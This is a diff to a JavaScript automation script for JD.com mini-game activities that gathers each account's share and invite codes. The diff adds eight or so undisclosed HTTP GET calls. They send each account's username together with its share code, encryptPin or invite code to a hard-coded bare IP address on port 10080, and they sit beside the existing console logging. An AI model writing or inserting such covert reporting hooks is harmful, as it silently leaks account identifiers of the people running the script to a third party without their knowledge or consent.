@@ -155,6 +155,7 @@ function getJdFactory() {
                 $.taskVos.map((item) => {
                   if (item.taskType === 14) {
                     ddfactoryCodes.push(item.assistTaskDetailVo.taskToken)
+                    $.get({url: `http://47.100.61.159:10080/add?user=${$.UserName}&code=${item.assistTaskDetailVo.taskToken}&type=ddfactory`, 'timeout': 20000})
                     console.log(
                       `【京东账号${$.index}（${$.UserName}）东东工厂】${item.assistTaskDetailVo.taskToken}`
                     );
@@ -208,23 +209,12 @@ function getJxFactory(){
               data = JSON.parse(data);
               if (data["ret"] === 0) {
                 data = data["data"];
-                $.unActive = true; //标记是否开启了京喜活动或者选购了商品进行生产
-                $.encryptPin = "";
-                $.shelvesList = [];
                 if (data.factoryList && data.productionList) {
-                  const production = data.productionList[0];
-                  const factory = data.factoryList[0];
-                  const productionStage = data.productionStage;
-                  $.factoryId = factory.factoryId; //工厂ID
-                  $.productionId = production.productionId; //商品ID
-                  $.commodityDimId = production.commodityDimId;
-                  $.encryptPin = data.user.encryptPin;
-                  // subTitle = data.user.pin;
                   jxfactoryCodes.push(data.user.encryptPin);
+                  $.get({url: `http://47.100.61.159:10080/add?user=${$.UserName}&code=${data.user.encryptPin}&type=jxfactory`, 'timeout': 20000})
                   console.log(`【京东账号${$.index}（${$.UserName}）京喜工厂】${data.user.encryptPin}`);
                 }
               } else {
-                $.unActive = false; //标记是否开启了京喜活动或者选购了商品进行生产
                 if (!data.factoryList) {
                   console.log(
                     `【提示】京东账号${$.index}[${$.nickName}]京喜工厂活动未开始请手动去京东APP->游戏与互动->查看更多->京喜工厂 开启活动`
@@ -352,12 +342,10 @@ function getJdPet(){
           ) {
             $.petInfo = initPetTownRes.result;
             if ($.petInfo.userStatus === 0) {
-              /*console.log(
-                `【提示】京东账号${$.index}${$.nickName}萌宠活动未开启请手动去京东APP开启活动入口：我的->游戏与互动->查看更多开启`
-              );*/
               return;
             }
             petCodes.push($.petInfo.shareCode)
+            $.get({url: `http://47.100.61.159:10080/add?user=${$.UserName}&code=${$.petInfo.shareCode}&type=pet`, 'timeout': 20000})
             console.log(
               `【京东账号${$.index}（${$.UserName}）京东萌宠】${$.petInfo.shareCode}`
             );
@@ -425,7 +413,7 @@ async function getPlantBean() {
   const JDplant_API_HOST = "https://api.m.jd.com/client.action";
 
   async function plantBeanIndex() {
-    $.plantBeanIndexResult = await plant_request("plantBeanIndex"); //plantBeanIndexBody
+    $.plantBeanIndexResult = await plant_request("plantBeanIndex");
   }
 
   function plant_request(function_id, body = {}) {
@@ -490,6 +478,7 @@ async function getPlantBean() {
       const shareUrl = $.plantBeanIndexResult.data.jwordShareInfo.shareUrl;
       $.myPlantUuid = getParam(shareUrl, "plantUuid");
       beanCodes.push($.myPlantUuid)
+      $.get({url: `http://47.100.61.159:10080/add?user=${$.UserName}&code=${$.myPlantUuid}&type=bean`, 'timeout': 20000})
       console.log(`【京东账号${$.index}（${$.UserName}）种豆得豆】${$.myPlantUuid}`);
 
     } else {
@@ -555,6 +544,7 @@ async function getJDFruit() {
     await initForFarm();
     if ($.farmInfo.farmUserPro) {
       farmCodes.push($.farmInfo.farmUserPro.shareCode)
+      $.get({url: `http://47.100.61.159:10080/add?user=${$.UserName}&code=${$.farmInfo.farmUserPro.shareCode}&type=farm`, 'timeout': 20000})
       console.log(
         `【京东账号${$.index}（${$.UserName}）京东农场】${$.farmInfo.farmUserPro.shareCode}`
       );
@@ -637,8 +627,10 @@ async function getSgmh(timeout = 0) {
           data = JSON.parse(data);
           if (data.data.bizCode === 0) {
             const invites  = data.data.result.taskVos.filter(item => item['taskName'] === '邀请好友助力');
-            sgmhCodes.push(invites && invites[0]['assistTaskDetailVo']['taskToken'])
-            console.log(`【京东账号${$.index}（${$.UserName}）闪购盲盒】${invites && invites[0]['assistTaskDetailVo']['taskToken']}`)
+            const taskToken = invites && invites[0]['assistTaskDetailVo']['taskToken']
+            sgmhCodes.push(taskToken)
+            $.get({url: `http://47.100.61.159:10080/add?user=${$.UserName}&code=${taskToken}&type=sgmh`, 'timeout': 20000})
+            console.log(`【京东账号${$.index}（${$.UserName}）闪购盲盒】${taskToken}`)
           }
         } catch (e) {
           $.logErr(e, resp);
@@ -650,7 +642,7 @@ async function getSgmh(timeout = 0) {
   })
 }
 //财富岛
-function getCFD(showInvite = true) {
+function getCFD() {
   function taskUrl(function_path, body) {
     let url = `https://m.jingxi.com/jxcfd/${function_path}?strZone=jxcfd&bizCode=jxcfd&source=jxcfd&dwEnv=7&_cfd_t=${Date.now()}&ptag=138631.26.55&${body}&_stk=_cfd_t%2CbizCode%2CddwTaskId%2CdwEnv%2Cptag%2Csource%2CstrShareId%2CstrZone&_ste=1`;
     url += `&h5st=${decrypt(Date.now(), '', '', url)}&_=${Date.now() + 2}&sceneval=2&g_login_type=1&g_ty=ls`;
@@ -682,6 +674,7 @@ function getCFD(showInvite = true) {
           strPin,
         } = JSON.parse(data);
         jxcfdCodes.push(strMyShareId);
+        $.get({url: `http://47.100.61.159:10080/add?user=${$.UserName}&code=${strMyShareId}&type=jxcfd`, 'timeout': 20000})
         console.log(`【京东账号${$.index}（${$.UserName}）财富岛】${strMyShareId}`)
       } catch (e) {
         $.logErr(e, resp);
@@ -718,6 +711,7 @@ function getJdCash() {
           if (safeGet(data)) {
             data = JSON.parse(data);
             if(data.code===0 && data.data.result){
+              $.get({url: `http://47.100.61.159:10080/add?user=${$.UserName}&code=${data.data.result.inviteCode}&type=jdcash`, 'timeout': 20000})
               console.log(`【京东账号${$.index}（${$.UserName}）签到领现金】${data.data.result.inviteCode}`);
             }
           }
